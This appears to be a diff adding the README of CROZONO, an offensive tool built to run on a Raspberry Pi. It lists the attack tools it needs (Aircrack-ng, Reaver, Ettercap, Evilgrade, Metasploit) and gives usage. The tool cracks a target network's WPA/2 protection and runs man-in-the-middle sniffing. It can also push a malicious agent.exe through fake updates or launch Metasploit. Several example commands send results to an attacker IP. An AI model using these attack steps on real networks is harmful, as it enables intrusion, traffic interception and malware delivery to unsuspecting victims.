@@ -1,0 +1,62 @@
+-------------------------------------------------------------------------
+  CROZONO - 01.07.15.23.46.00 - www.crozono.com - crozono.pro@gmail.com
+
+  Author: Sheila Ayelen Berta a.k.a Shei Winker
+	    Twitter: @UnaPibaGeek
+        Web: www.semecayounexploit.com (SMC1E)
+
+  Licensed under the GNU General Public License Version 2 (GNU GPL v2),
+        available at: http://www.gnu.org/licenses/gpl-2.0.txt
+  
+-------------------------------------------------------------------------
+
+CROZONO has been developed to run in Raspberry PI. Use Raspbian or Kali Linux (for Raspberry) as operative system.
+
+INSTALL:
+
+- pexpect (python library)
+CROZONO need pexpect python library to run correctly.
+
+If you want to use the full crozono's attacks, you must install the following tools:
+
+- Aircrack-ng.
+- Reaver.
+- PixieWPS.
+- Nmap.
+- Ettercap.
+- Tshark.
+- Evilgrade.
+- Metasploit.
+
+NOTE:
+	if you want to use Evilgrade, put your agent in "evilgrade" folder and rename it to "agent.exe".
+	if you want to use dictionary to attack to WPA/2 protections, put your diccionary in CROZONO folder and rename it to "dic".
+	
+
+PARAMETERS:
+	For attack a specific network, put the essid with  "-e" parameter. 
+		For example: crozono.py -e <essid>
+	if you have the password of access point, put it with "-k" parameter. 
+		For example: crozono.py -e <essid> -k <password>
+	if you want that CROZONO open a connection to attacker, put the IP address of attacker with "-d" parameter. 
+		For example: crozono.py -d 190.190.190.190
+	if you want that CROZONO perform a local network attack, put the attack to use with "-a" parameter.
+		For example:
+			crozono.py -d 190.190.190.190 -a sniffing-mitm
+			crozono.py -d 190.190.190.190 -a evilgrade
+			crozono.py -d 190.190.190.190 -a metasploit
+	
+	The free version of CROZONO only support three attacks: sniffing-mitm, evilgrade and metasploit.
+	The attacks provide information in real time to attacker, so you must use the parameter -a and -d together.
+	
+EXAMPLES:
+	crozono.py
+	crozono.py -e <essid>
+	crozono.py -e <essid> -k <key>
+	crozono.py -a metasploit -d 190.190.190.190
+	crozono.py -e <essid> -a sniffing-mitm -d 190.190.190.190
+	crozono.py -e <essid> -k <key> -a evilgrade -d 190.190.190.190
+
+FOR CROZONO PRO VERSION:
+	www.crozono.com
+	crozono.pro@gmail.com
